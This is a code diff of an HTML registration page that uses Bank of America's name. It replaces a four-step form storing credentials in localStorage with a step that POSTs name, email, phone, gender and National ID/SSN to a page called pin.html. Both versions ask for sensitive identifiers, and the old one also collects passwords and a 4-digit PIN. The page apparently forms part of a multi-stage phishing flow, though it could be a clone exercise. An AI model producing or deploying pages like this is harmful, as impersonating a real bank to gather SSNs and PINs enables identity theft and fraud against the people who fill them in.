@@ -2,182 +2,107 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Bank of America - Create Account</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Create Account - Bank of America</title>
   <style>
-    body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
-    .container { max-width: 700px; margin: auto; background: #fff; padding: 20px; border-radius: 8px; }
-    .step-pane { display: none; }
-    .step-pane.active { display: block; }
-    .alert { display: none; padding: 10px; margin-bottom: 15px; background: #ffdddd; border: 1px solid #cc0000; }
-    .preview-img { display: none; max-width: 150px; border-radius: 8px; margin-top: 10px; }
-    .stepper span.active { font-weight: bold; color: green; }
-    .pin-popup {
-      display: none;
-      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.6);
-      align-items: center; justify-content: center;
+    body {
+      font-family: Arial, sans-serif;
+      background: #f7f7f7;
+      margin: 0;
+      padding: 20px;
     }
-    .pin-box {
-      background: #fff; padding: 20px; border-radius: 10px; text-align: center;
-      width: 300px;
+
+    .container {
+      max-width: 500px;
+      margin: auto;
+      background: #fff;
+      padding: 25px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-    .pin-box img { width: 80px; height: 80px; border-radius: 50%; margin-bottom: 10px; }
-    .pin-box input { font-size: 20px; padding: 10px; text-align: center; width: 100px; letter-spacing: 5px; }
+
+    h1 {
+      font-size: 22px;
+      margin-bottom: 15px;
+    }
+
+    p {
+      font-size: 15px;
+      margin-bottom: 20px;
+    }
+
+    .steps {
+      margin: 15px 0;
+      font-size: 16px;
+    }
+
+    label {
+      display: block;
+      margin: 12px 0 6px;
+      font-weight: bold;
+    }
+
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      font-size: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      box-sizing: border-box;
+    }
+
+    button {
+      margin-top: 20px;
+      background: #0070c9;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    button:hover {
+      background: #005fa3;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>Bank of America - Create Account</h2>
-    <p>Welcome to Bank of America online registration. Please fill out the form below carefully to open your secure digital account. Ensure all information matches your government-issued identification.</p>
-    <div id="alert" class="alert"></div>
+    <h1>Bank of America - Create Account</h1>
+    <p>
+      Welcome to Bank of America online registration.  
+      Please fill out the form below carefully to open your secure digital account.
+    </p>
 
-    <div class="stepper">
-      <span id="s1">Step 1</span> → 
-      <span id="s2">Step 2</span> → 
-      <span id="s3">Step 3</span> → 
-      <span id="s4">Step 4</span>
+    <div class="steps">
+      <b style="color:green;">Step 1</b> → Step 2 → Step 3 → Step 4
     </div>
 
-    <form id="regForm">
-      <!-- Step 1 -->
-      <div class="step-pane" data-step="1">
-        <p><input id="firstName" placeholder="First Name (e.g., John)"></p>
-        <p><input id="lastName" placeholder="Last Name (e.g., Smith)"></p>
-        <p><input id="email" type="email" placeholder="Email (e.g., john.smith@email.com)"></p>
-        <p><input id="phone" type="tel" placeholder="Phone (e.g., +1 555 123 4567)"></p>
-        <p><input id="dob" type="date" placeholder="Date of Birth"></p>
-        <p><input id="nationalId" placeholder="National ID / SSN (e.g., 123-45-6789)"></p>
-        <button type="button" onclick="nextStep()">Next</button>
-      </div>
+    <form action="pin.html" method="POST">
+      <label for="fname">First Name</label>
+      <input type="text" id="fname" name="fname" placeholder="e.g., John" required>
 
-      <!-- Step 2 -->
-      <div class="step-pane" data-step="2">
-        <p><input id="country" placeholder="Country (e.g., United States)"></p>
-        <p><input id="state" placeholder="State (e.g., California)"></p>
-        <p><input id="street" placeholder="Street (e.g., 123 Main St)"></p>
-        <p><input id="city" placeholder="City (e.g., Los Angeles)"></p>
-        <p><input id="zip" placeholder="Zip Code (e.g., 90001)"></p>
-        <button type="button" onclick="prevStep()">Back</button>
-        <button type="button" onclick="nextStep()">Next</button>
-      </div>
+      <label for="lname">Last Name</label>
+      <input type="text" id="lname" name="lname" placeholder="e.g., Smith" required>
 
-      <!-- Step 3 -->
-      <div class="step-pane" data-step="3">
-        <p><select id="accountType"><option>Savings</option><option>Checking</option></select></p>
-        <p><select id="currency"><option>USD</option><option>EUR</option><option>GBP</option></select></p>
-        <p><input id="occupation" placeholder="Occupation (e.g., Software Engineer)"></p>
-        <p><input id="employer" placeholder="Employer (e.g., Google Inc.)"></p>
-        <p><input id="username" placeholder="Username (e.g., johnsmith123)"></p>
-        <p><input id="password" type="password" placeholder="Password (min 8 characters)"></p>
-        <p><input id="confirmPassword" type="password" placeholder="Confirm Password"></p>
-        <p><input id="pin" type="password" maxlength="4" placeholder="4-digit PIN (e.g., 1234)"></p>
-        <p><input id="confirmPin" type="password" maxlength="4" placeholder="Confirm PIN"></p>
-        <p><input id="imageUpload" type="file" accept="image/*"></p>
-        <img id="preview" class="preview-img">
-        <p><label><input type="checkbox" id="terms"> I agree to the Bank of America terms and conditions</label></p>
-        <button type="button" onclick="prevStep()">Back</button>
-        <button type="button" onclick="nextStep()">Next</button>
-      </div>
+      <label for="email">Email</label>
+      <input type="email" id="email" name="email" placeholder="e.g., john.smith@email.com" required>
 
-      <!-- Step 4 -->
-      <div class="step-pane" data-step="4">
-        <p>Review your details carefully before submitting your application.</p>
-        <button type="button" onclick="prevStep()">Back</button>
-        <button type="submit">Create Account</button>
-      </div>
+      <label for="phone">Phone</label>
+      <input type="tel" id="phone" name="phone" placeholder="e.g., +1 555 123 4567" required>
+
+      <label for="gender">Gender</label>
+      <select id="gender" name="gender" required>
+        <option value="">-- Select --</option>
+        <option value="male">Male</option>
+        <option value="female">Female</option>
+        <option value="other">Other</option>
+      </select>
+
+      <label for="id">National ID / SSN</label>
+      <input type="text" id="id" name="id" placeholder="e.g., 123-45-6789" required>
+
+      <button type="submit">Next</button>
     </form>
   </div>
-
-  <!-- PIN Popup -->
-  <div id="pinPopup" class="pin-popup">
-    <div class="pin-box">
-      <img id="pinPhoto" src="">
-      <h3>Enter Your 4-digit PIN</h3>
-      <input id="pinEntry" type="password" maxlength="4">
-      <div style="margin-top:15px;">
-        <button onclick="checkPin()">Submit</button>
-      </div>
-    </div>
-  </div>
-
-<script>
-document.addEventListener("DOMContentLoaded", () => {
-  let step = 1;
-  const panes = document.querySelectorAll(".step-pane");
-  const alertBox = document.getElementById("alert");
-  const pinPopup = document.getElementById("pinPopup");
-  const pinPhoto = document.getElementById("pinPhoto");
-  let imageData = "";
-  let newUser = null;
-
-  function updateStepper() {
-    panes.forEach(p => p.style.display = (Number(p.dataset.step) === step) ? "block" : "none");
-    for (let i=1;i<=4;i++) {
-      document.getElementById("s"+i).classList.toggle("active", i <= step);
-    }
-    alertBox.style.display = "none";
-  }
-  window.nextStep = ()=>{ if(step<4){step++;updateStepper();} }
-  window.prevStep = ()=>{ if(step>1){step--;updateStepper();} }
-  updateStepper();
-
-  // Image preview
-  const imgInput = document.getElementById("imageUpload");
-  const preview = document.getElementById("preview");
-  imgInput.addEventListener("change", e=>{
-    const file = e.target.files[0];
-    if(!file) return;
-    const reader = new FileReader();
-    reader.onload = ev=>{
-      imageData = ev.target.result;
-      preview.src = imageData;
-      preview.style.display="block";
-    };
-    reader.readAsDataURL(file);
-  });
-
-  // Submit handler
-  document.getElementById("regForm").addEventListener("submit", e=>{
-    e.preventDefault();
-    function byId(id){return document.getElementById(id).value.trim();}
-    if(!byId("firstName")||!byId("lastName")||!byId("email")||!byId("phone")||!byId("dob")
-      ||!byId("country")||!byId("state")||!byId("street")||!byId("city")||!byId("zip")
-      ||!byId("accountType")||!byId("currency")||!byId("occupation")
-      ||!byId("username")||!byId("password")||!byId("confirmPassword")||!byId("pin")||!byId("confirmPin")){
-      alertBox.innerText="Please complete all required fields.";
-      alertBox.style.display="block"; return;
-    }
-    if(byId("password")!==byId("confirmPassword")){alertBox.innerText="Passwords do not match.";alertBox.style.display="block";return;}
-    if(byId("pin")!==byId("confirmPin")){alertBox.innerText="PINs do not match.";alertBox.style.display="block";return;}
-    if(!document.getElementById("terms").checked){alertBox.innerText="Please accept terms.";alertBox.style.display="block";return;}
-
-    newUser = {
-      username: byId("username"),
-      pin: byId("pin"),
-      firstName: byId("firstName"),
-      lastName: byId("lastName"),
-      email: byId("email"),
-      image: imageData
-    };
-    const users = JSON.parse(localStorage.getItem("users")||"[]");
-    users.push(newUser);
-    localStorage.setItem("users", JSON.stringify(users));
-    localStorage.setItem("loggedInUser", JSON.stringify(newUser));
-
-    // Show PIN popup with photo
-    if(imageData){ pinPhoto.src = imageData; }
-    pinPopup.style.display="flex";
-  });
-
-  window.checkPin = ()=>{
-    const entry = document.getElementById("pinEntry").value.trim();
-    if(newUser && entry === newUser.pin){
-      window.location.href="user-dashboard.html";
-    } else {
-      alert("Incorrect PIN. Try again.");
-    }
-  };
-});
-</script>
 </body>
 </html>
